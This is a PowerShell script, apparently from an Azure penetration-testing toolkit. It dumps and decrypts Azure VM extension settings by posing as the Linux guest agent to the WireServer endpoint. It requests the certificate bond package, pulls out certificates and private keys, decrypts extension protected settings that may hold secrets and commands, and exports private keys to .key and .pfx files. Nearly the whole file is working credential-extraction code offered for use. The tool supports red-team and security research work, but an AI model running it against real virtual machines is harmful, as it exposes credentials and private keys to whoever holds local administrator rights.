<#
	File: Get-AzureVMExtensionSettingsWireServer.ps1
	Author: Karl Fosaaen (@kfosaaen), NetSPI - 2025
	Description: PowerShell function for dumping and decrypting Azure VM Extension Settings via the WireServer endpoint
	Original Research: 
        - "ChaosDB explained: Azure's Cosmos DB vulnerability walkthrough" by Nir Ohfeld and Sagi Tzadik
            - https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough
        - "CVE-2021-27075: Microsoft Azure Vulnerability Allows Privilege Escalation and Leak of Private Data" by Paul Litvak
            - https://intezer.com/blog/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/
	
#>

Function Get-AzureVMExtensionSettingsWireServer
{
<#
	.SYNOPSIS
		PowerShell function for dumping and decrypting Azure VM Extension Settings via WireServer endpoint (168.63.129.16)
	.DESCRIPTION
		This function implements the WireServer certificate extraction technique noted during the ChaosDB vulnerability research.
		1. Contacts WireServer (168.63.129.16) to retrieve VM extension configurations
		2. Performs secure certificate exchange with WireServer to obtain certificate bond package
		3. Parses the certificate bond package to extract X.509 certificates and private keys
		4. Uses extracted certificates to decrypt protected settings in VM extensions
	.PARAMETER OutputPath
		Optional path to save retrieved certificates and extension data. 
		Defaults to current directory (no file export).
	.PARAMETER Verbose
		Enable verbose output to show detailed information during execution.
	.EXAMPLE
		PS C:\> Get-AzureVMExtensionSettingsWireServer
		
		ExtensionName                   : Microsoft.Compute.CustomScriptExtension
		ProtectedSettingsCertThumbprint : 23B8893CD7A1B2C3D4E5F6789ABC123DEF456789
		ProtectedSettings               : MIIB8AYJKoZIhvcNAQcDoIIB4TCCAd0CAQAxgg...
		ProtectedSettingsDecrypted      : {"fileUris":["https://storage.blob.core.windows.net/scripts/deploy.ps1"],"commandToExecute":"powershell -ExecutionPolicy Bypass -File deploy.ps1"}
		PublicSettings                  : {"timestamp":123456789}
		
	.EXAMPLE
		PS C:\> Get-AzureVMExtensionSettingsWireServer -OutputPath "C:\temp\output" -Verbose
		
		Retrieves extension settings, extracts certificates from WireServer bond package, and exports
		all certificates to individual files in multiple formats.
		
	.NOTES
		This function requires local administrator rights for network access to 168.63.129.16 (WireServer)
    .LINK
    https://intezer.com/blog/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/
    https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough
    https://www.akamai.com/blog/security/recovering-plaintext-passwords-azure 

#>

	[CmdletBinding()]
	param(
		[Parameter(Mandatory=$false)]
		[string]$OutputPath = ""
	)

	# Load required assemblies
	[System.Reflection.Assembly]::LoadWithPartialName("System.Security") | Out-Null

	# Create output directory if needed
	if (-not [string]::IsNullOrEmpty($OutputPath)) {
		try {
			if (-not (Test-Path $OutputPath)) {
				New-Item -ItemType Directory -Path $OutputPath -Force -ErrorAction Stop | Out-Null
				Write-Verbose "[+] Created output directory: $OutputPath"
			}
		} catch {
			Write-Error "Failed to create output directory '$OutputPath': $($_.Exception.Message)"
			return
		}
	}
    else{
        $OutputPath = $PWD.Path
    }

	# WireServer endpoint
	$wireServerEndpoint = "168.63.129.16"
    $goalstateUrl = "http://$wireServerEndpoint/machine/?comp=goalstate"
	
	try {
		# Test connectivity to WireServer
		Write-Verbose "Testing connectivity to WireServer..."
		$testConnection = Test-NetConnection -ComputerName $wireServerEndpoint -Port 80 -InformationLevel Quiet
		if (-not $testConnection) {
			Write-Warning "Unable to reach WireServer endpoint $wireServerEndpoint"
			Write-Warning "This may indicate:"
			Write-Warning "`t1. Not running on an Azure VM"
			Write-Warning "`t2. Network restrictions are in place"
			Write-Warning "`t3. WireServer access has been patched/restricted"
			return
		}
		
		Write-Verbose "`tConnected to WireServer"
		
        # Retrieve goalstate configuration
		Write-Verbose "`t`tRetrieving goalstate configuration..."
        $goalstateConfigResponse = Invoke-WebRequest -Uri $goalstateUrl -UseBasicParsing -ErrorAction Stop -Headers @{"x-ms-agent-name"="WALinuxAgent"; "x-ms-version"="2015-04-05"} -Verbose:$false
        $extensionConfigUrl = ([xml]$goalstateConfigResponse.content).GoalState.Container.RoleInstanceList.RoleInstance.Configuration.ExtensionsConfig

		# Retrieve extension configuration
		Write-Verbose "`t`tRetrieving extension configurations..."
		$extensionConfigResponse = Invoke-WebRequest -Uri $extensionConfigUrl -UseBasicParsing -ErrorAction Stop -Headers @{"x-ms-agent-name"="WALinuxAgent"; "x-ms-version"="2015-04-05"} -Verbose:$false
		
		if ($extensionConfigResponse.StatusCode -eq 200) {
			[xml]$extensionConfig = $extensionConfigResponse.Content
			
			# Count extensions
			if ($extensionConfig.Extensions.PluginSettings.Plugin) {
				if ($extensionConfig.Extensions.PluginSettings.Plugin -is [System.Array]) {
					$extensionCount = $extensionConfig.Extensions.PluginSettings.Plugin.Count
				} else {
					$extensionCount = 1
				}
			} else {
				$extensionCount = 0
			}
			
			# Display discovered extensions
			if ($extensionCount -gt 0) {
				Write-Verbose "`t`tDiscovered VM Extensions:"
				
				$pluginsToDisplay = if ($extensionConfig.Extensions.PluginSettings.Plugin -is [System.Array]) {
					$extensionConfig.Extensions.PluginSettings.Plugin
				} else {
					@($extensionConfig.Extensions.PluginSettings.Plugin)
				}
				
				foreach ($plugin in $pluginsToDisplay) {
					Write-Verbose "`t`t`tExtension: $($plugin.name)"
					
					if ($plugin.RuntimeSettings.'#text') {
						try {
							$runtimeSettings = $plugin.RuntimeSettings.'#text' | ConvertFrom-Json
							$settingsArray = if ($runtimeSettings.runtimeSettings) { $runtimeSettings.runtimeSettings } else { @($runtimeSettings) }
							
							foreach ($setting in $settingsArray) {
								$thumbprint = $setting.handlerSettings.protectedSettingsCertThumbprint
								$hasProtectedSettings = $setting.handlerSettings.protectedSettings
								
								if ($thumbprint) {
									Write-Verbose "`t`t`tThumbprint: $thumbprint"
									Write-Verbose "`t`t`tProtected Settings: $(if ($hasProtectedSettings) { 'YES' } else { 'NO' })"
								} else {
									Write-Verbose "`t`t`tThumbprint: (none)"
									Write-Verbose "`t`t`tProtected Settings: NO"
								}
							}
						} catch {
							Write-Verbose "`tError parsing settings: $($_.Exception.Message)"
						}
					}
				}
			} else {
				Write-Verbose "No VM extensions found"
			}
		} else {
			Write-Verbose "Failed to retrieve extension configuration. Status: $($extensionConfigResponse.StatusCode)"
			return
		}
		
		# Retrieve certificate bond package
		Write-Verbose "`tRetrieving certificate bond package..."
        $certificatesUrl = ([xml]$goalstateConfigResponse.content).GoalState.Container.RoleInstanceList.RoleInstance.Configuration.Certificates

        # Generate temporary certificate
        Write-Verbose "`t`tGenerating temporary certificate..."
        
        try {
            $tempCert = New-SelfSignedCertificate `
                -CertStoreLocation "Cert:\CurrentUser\My" `
                -Subject "CN=MicroBurst-Temp" `
                -KeyExportPolicy Exportable `
                -KeySpec KeyExchange `
                -KeyUsage KeyEncipherment,DataEncipherment `
                -KeyLength 2048 `
                -HashAlgorithm sha256 `
                -NotAfter (Get-Date).AddDays(1)
                
            Write-Verbose "`t`t`tCreated certificate: $($tempCert.Thumbprint)"
        } catch {
            Write-Warning "Failed to create certificate in CurrentUser\My: $($_.Exception.Message)"
            
            try {
                $tempCert = New-SelfSignedCertificate `
                    -CertStoreLocation "Cert:\LocalMachine\My" `
                    -Subject "CN=MicroBurst-Temp" `
                    -KeyExportPolicy Exportable `
                    -KeySpec KeyExchange `
                    -KeyUsage KeyEncipherment,DataEncipherment `
                    -KeyLength 2048 `
                    -HashAlgorithm sha256 `
                    -NotAfter (Get-Date).AddDays(1)
                    
                Write-Verbose "`t`t`tCreated certificate in LocalMachine: $($tempCert.Thumbprint)"
            } catch {
                Write-Error "Failed to create certificate: $($_.Exception.Message)"
                return
            }
        }
        
        # Export certificate for exchange
        $tempCertPath = "$env:TEMP\microburst_cert.cer"
        Export-Certificate -Cert $tempCert -FilePath $tempCertPath | Out-Null
        $publicCertBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($tempCertPath))
        Remove-Item $tempCertPath -Force -ErrorAction SilentlyContinue

        # Build headers for certificate request
        $certificateHeaders = @{
            "x-ms-agent-name" = "WALinuxAgent"
            "x-ms-version" = "2012-11-30"
            "x-ms-cipher-name" = "DES_EDE3_CBC"
            "x-ms-guest-agent-public-x509-cert" = $publicCertBase64
        }

		# Request certificate bond package
		Write-Verbose "`t`tRequesting certificate bond package..."
		$certificatesResponse = Invoke-WebRequest -Uri (-join($certificatesUrl,"&type=fullConfig")) -UseBasicParsing -ErrorAction Stop -Headers $certificateHeaders -Verbose:$false
		
		if ($certificatesResponse.StatusCode -eq 200) {
			Write-Verbose "`t`t`tRetrieved certificate bond package"
			
			$availableCerts = @{}
			
			# Decrypt bond package
			try {
				Write-Verbose "`tDecrypting bond package..."
				$encryptedData = $certificatesResponse.Content
				$decryptedContent = $null
				
				if ($encryptedData.StartsWith("<?xml")) {
					[xml]$encryptedXml = $encryptedData
					if ($encryptedXml.CertificateFile -and $encryptedXml.CertificateFile.Data) {
						$encryptedBytes = [System.Convert]::FromBase64String($encryptedXml.CertificateFile.Data)
					} else {
						Write-Warning "Expected CertificateFile XML structure not found"
						return
					}
				} else {
					$encryptedBytes = [System.Convert]::FromBase64String($encryptedData)
				}
				
				# Decrypt using EnvelopedCms
				$thumbprint = $tempCert.Thumbprint
				Start-Sleep -Milliseconds 500
				
				# Find certificate in store
				$cert2 = Get-ChildItem -Path 'Cert:\CurrentUser\My' -Recurse | Where-Object {$_.Thumbprint -eq $thumbprint}
				if (-not $cert2) {
					$cert2 = Get-ChildItem -Path 'Cert:\LocalMachine\My' -Recurse | Where-Object {$_.Thumbprint -eq $thumbprint}
				}
				
				if (-not $cert2) {
					Write-Warning "Could not retrieve certificate from store"
					return
				}
				
				if (-not $cert2.HasPrivateKey) {
					Write-Warning "Certificate does not have accessible private key"
					return
				}
				
				# Attempt decryption
				try {
					$envelope = New-Object Security.Cryptography.Pkcs.EnvelopedCms
					$envelope.Decode($encryptedBytes)
					$certCollection = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection
					$certCollection.Add($cert2) | out-null
					$envelope.Decrypt($certCollection)
					$decryptedContent = [System.Text.Encoding]::UTF8.GetString($envelope.ContentInfo.Content)
					
					Write-Verbose "`t`tSuccessfully decrypted bond package"
				} catch {
					# Try treating data as unencrypted
					try {
						$decryptedContent = [System.Text.Encoding]::UTF8.GetString($encryptedBytes)
						Write-Verbose "Data appears to be unencrypted"
					} catch {
						Write-Warning "Failed to process certificate data: $($_.Exception.Message)"
						throw
					}
				}
				
				# Extract certificates from bond package
				Write-Verbose "`tExtracting certificates..."
				$bondData = if ($envelope -and $envelope.ContentInfo -and $envelope.ContentInfo.Content) {
					$envelope.ContentInfo.Content
				} else {
					$encryptedBytes
				}
				
				# Save bond package
				if ($bondData -and $bondData.Length -gt 0) {
   					try {
						if (-not (Test-Path $OutputPath)) {
							New-Item -ItemType Directory -Path $OutputPath -Force -ErrorAction Stop | Out-Null
						}
						$bondFilePath = "$OutputPath\certificate_bond.bin"
						[IO.File]::WriteAllBytes($bondFilePath, $bondData)
						Write-Verbose "`t`tSaved bond package: $bondFilePath"
					} catch {
						Write-Warning "Failed to save bond package: $($_.Exception.Message)"
						$bondFilePath = $null
					}
				}
				
				# Try to parse bond data as certificate collection
				if ($bondData -and $bondData.Length -gt 0) {
					try {
						$certCollection = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection
						
						# Try importing from saved file first, fallback to memory if file save failed
						if ($bondFilePath -and (Test-Path $bondFilePath)) {
							$certCollection.Import($bondFilePath)
						} else {
							Write-Verbose "`t`tBond file not available, importing from memory"
							$certCollection.Import($bondData)
						}
						
						if ($certCollection.Count -gt 0) {
							foreach ($cert in $certCollection) {
								$availableCerts[$cert.Thumbprint] = $cert
								Write-Verbose "`tExtracted certificate: $($cert.Subject) ($($cert.Thumbprint))"
								
								# Export certificate if output path specified
								if ($OutputPath -ne ".") {
									Export-CertificateToFile -Certificate $cert -OutputPath $OutputPath
								}
							}
						}
					} catch {
						Write-Warning "Failed to parse certificates: $($_.Exception.Message)"
					}
				}
				
			} catch {
				Write-Warning "Failed to decrypt WireServer response: $($_.Exception.Message)"
			}
		} else {
			Write-Warning "Failed to retrieve certificates. Status: $($certificatesResponse.StatusCode)"
			return
		}
		
		# Clean up temporary certificate
		try {
			if ($tempCert -and -not [string]::IsNullOrWhiteSpace($tempCert.Thumbprint)) {
				if (Get-ChildItem -Path "Cert:\CurrentUser\My\$($tempCert.Thumbprint)" -ErrorAction SilentlyContinue) {
					Remove-Item -Path "Cert:\CurrentUser\My\$($tempCert.Thumbprint)" -Force
				} elseif (Get-ChildItem -Path "Cert:\LocalMachine\My\$($tempCert.Thumbprint)" -ErrorAction SilentlyContinue) {
					Remove-Item -Path "Cert:\LocalMachine\My\$($tempCert.Thumbprint)" -Force
				}
			}
		} catch {
			Write-Verbose "Could not remove temporary certificate: $($_.Exception.Message)"
		}
		
		# Process and decrypt VM extensions
		Write-Verbose "`tProcessing VM extensions..."
		$decryptionResults = @()
		
		if ($extensionConfig.Extensions.PluginSettings.Plugin) {
			if ($extensionConfig.Extensions.PluginSettings.Plugin -is [System.Array]) {
				$pluginsToProcess = $extensionConfig.Extensions.PluginSettings.Plugin
			} else {
				$pluginsToProcess = @($extensionConfig.Extensions.PluginSettings.Plugin)
			}
			
			foreach ($plugin in $pluginsToProcess) {
				try {
					if ($plugin.RuntimeSettings.'#text') {
						try {
							$runtimeSettings = $plugin.RuntimeSettings.'#text' | ConvertFrom-Json
							$settingsArray = if ($runtimeSettings.runtimeSettings) { $runtimeSettings.runtimeSettings } else { @($runtimeSettings) }
							
							foreach ($setting in $settingsArray) {
								$outputObj = ProcessExtensionSetting -Plugin $plugin -Setting $setting -AvailableCerts $availableCerts
								if ($outputObj) {
									$decryptionResults += $outputObj
									
									if ($outputObj.ProtectedSettingsDecrypted) {
										Write-Verbose "`t`tSUCCESS: Decrypted ProtectedSettings for the $($outputObj.ExtensionName) extension"
									} elseif ($outputObj.ProtectedSettingsCertThumbprint) {
										Write-Verbose "`t`tFAILED: Could not decrypt ProtectedSettings for the $($outputObj.ExtensionName) extension"
									}
									
									Write-Output $outputObj
								}
							}
						} catch {
							Write-Warning "Failed to parse runtime settings for $($plugin.name): $($_.Exception.Message)"
						}
					}
				} catch {
					Write-Warning "Failed to process extension $($plugin.name): $($_.Exception.Message)"
				}
			}
		}
		
		
	} catch {
		Write-Verbose "Error: $($_.Exception.Message)"
		
		# Emergency certificate cleanup
		if ($tempCert -and -not [string]::IsNullOrWhiteSpace($tempCert.Thumbprint)) {
			try {
				if (Get-ChildItem -Path "Cert:\CurrentUser\My\$($tempCert.Thumbprint)" -ErrorAction SilentlyContinue) {
					Remove-Item -Path "Cert:\CurrentUser\My\$($tempCert.Thumbprint)" -Force
				} elseif (Get-ChildItem -Path "Cert:\LocalMachine\My\$($tempCert.Thumbprint)" -ErrorAction SilentlyContinue) {
					Remove-Item -Path "Cert:\LocalMachine\My\$($tempCert.Thumbprint)" -Force
				}
			} catch {
				Write-Verbose "Could not perform emergency certificate cleanup: $($_.Exception.Message)"
			}
		}
	}
    Write-Verbose "Certificate extraction and ProtectedSettings decryption completed"
}

# Helper function to process extension settings
function ProcessExtensionSetting {
	param(
		$Plugin,
		$Setting,
		$AvailableCerts
	)
	
	$outputObj = "" | Select-Object -Property ExtensionName,ProtectedSettingsCertThumbprint,ProtectedSettings,ProtectedSettingsDecrypted,PublicSettings
	$outputObj.ExtensionName = $Plugin.name
	$outputObj.ProtectedSettingsCertThumbprint = $Setting.handlerSettings.protectedSettingsCertThumbprint
	$outputObj.ProtectedSettings = $Setting.handlerSettings.protectedSettings
	$outputObj.PublicSettings = $Setting.handlerSettings.publicSettings | ConvertTo-Json -Compress

	$thumbprint = $Setting.handlerSettings.protectedSettingsCertThumbprint
	
	if ($thumbprint -and $Setting.handlerSettings.protectedSettings) {
		if ($AvailableCerts.ContainsKey($thumbprint)) {
			$cert = $AvailableCerts[$thumbprint]
			
			try {
				$decrypted = DecryptProtectedSettings -ProtectedSettings $Setting.handlerSettings.protectedSettings -Certificate $cert
				if ($decrypted) {
					$outputObj.ProtectedSettingsDecrypted = $decrypted
				}
			} catch {
				Write-Verbose "Failed to decrypt with WireServer certificate: $($_.Exception.Message)"
			}
		} else {
			# Fallback: try local certificate store
			$localCert = Get-ChildItem -Path 'Cert:\' -Recurse | Where-Object {$_.Thumbprint -eq $thumbprint} | Select-Object -First 1
			if ($localCert -and $localCert.HasPrivateKey) {
				try {
					$decrypted = DecryptProtectedSettings -ProtectedSettings $Setting.handlerSettings.protectedSettings -Certificate $localCert
					if ($decrypted) {
						$outputObj.ProtectedSettingsDecrypted = $decrypted
					}
				} catch {
					Write-Verbose "Failed to decrypt with local certificate: $($_.Exception.Message)"
				}
			}
		}
	}
	
	return $outputObj
}

# Helper function to decrypt protected settings
function DecryptProtectedSettings {
	param(
		[string]$ProtectedSettings,
		[System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
	)
	
	try {
		$bytes = [System.Convert]::FromBase64String($ProtectedSettings)
		$envelope = New-Object Security.Cryptography.Pkcs.EnvelopedCms
		$envelope.Decode($bytes)
		$certCollection = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection
		$certCollection.Add($Certificate)
		$envelope.Decrypt($certCollection)
		$decryptedContent = [Text.Encoding]::UTF8.GetString($envelope.ContentInfo.Content)
		return $decryptedContent | ConvertFrom-Json | ConvertTo-Json -Compress
	} catch {
		return $null
	}
}

# Helper function to export certificates
function Export-CertificateToFile {
	param(
		[System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,
		[string]$OutputPath
	)
	
	if ([string]::IsNullOrWhiteSpace($OutputPath) -or $OutputPath -eq ".") {
		return
	}
	
	if (-not $Certificate) {
		return
	}
	
	try {
		if (-not (Test-Path $OutputPath)) {
			New-Item -ItemType Directory -Path $OutputPath -Force -ErrorAction Stop | Out-Null
		}
		
		$safeSubject = $Certificate.Subject -replace '[\\/:*?"<>|]', '_' -replace 'CN=', '' -replace ',.*', ''
		if ([string]::IsNullOrWhiteSpace($safeSubject)) {
			$safeSubject = "Unknown"
		}
		
		$baseFileName = "cert_$($safeSubject)_$($Certificate.Thumbprint.Substring(0,8))"
		
		# Export as .CRT (DER format)
		$certFileName = "$OutputPath\$baseFileName.crt"
		[System.IO.File]::WriteAllBytes($certFileName, $Certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert))
		Write-Verbose "`t`tExported: $certFileName"
		
		# Export as .PEM format
		$pemFileName = "$OutputPath\$baseFileName.pem"
		$certBase64 = [Convert]::ToBase64String($Certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert))
		$pemContent = "-----BEGIN CERTIFICATE-----`n"
		for ($i = 0; $i -lt $certBase64.Length; $i += 64) {
			$pemContent += $certBase64.Substring($i, [Math]::Min(64, $certBase64.Length - $i)) + "`n"
		}
		$pemContent += "-----END CERTIFICATE-----`n"
		$pemContent | Out-File -FilePath $pemFileName -Encoding ASCII
		Write-Verbose "`t`tExported: $pemFileName"
		
		# Export certificate info
		$infoFileName = "$OutputPath\$baseFileName.txt"
		$certInfo = @"
Certificate Information
Subject: $($Certificate.Subject)
Issuer: $($Certificate.Issuer)
Thumbprint: $($Certificate.Thumbprint)
Not Before: $($Certificate.NotBefore)
Not After: $($Certificate.NotAfter)
Has Private Key: $($Certificate.HasPrivateKey)
Extraction Date: $(Get-Date)
"@
		$certInfo | Out-File -FilePath $infoFileName -Encoding UTF8
		Write-Verbose "`t`tExported: $infoFileName"
		
		# Export private key if available
		if ($Certificate.HasPrivateKey) {
			try {
				if ($Certificate.PrivateKey) {
					try {
						$privateKeyFileName = "$OutputPath\$baseFileName.key"
						$privateKeyData = $Certificate.PrivateKey.ToXmlString($true)
						$privateKeyData | Out-File -FilePath $privateKeyFileName -Encoding UTF8
						Write-Verbose "`t`tExported: $privateKeyFileName"
					} catch {
						try {
							$pfxFileName = "$OutputPath\$baseFileName.pfx"
							$pfxBytes = $Certificate.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, "")
							[System.IO.File]::WriteAllBytes($pfxFileName, $pfxBytes)
							Write-Verbose "`tExported: $pfxFileName"
						} catch {
							Write-Verbose "`t`tCould not export private key as key/pfx: $($baseFileName)"
						}
					}
				}
			} catch {
				Write-Verbose "Failed to export private key: $($_.Exception.Message)"
			}
		}
		
	} catch {
		Write-Warning "Failed to export certificate: $($_.Exception.Message)"
	}
}
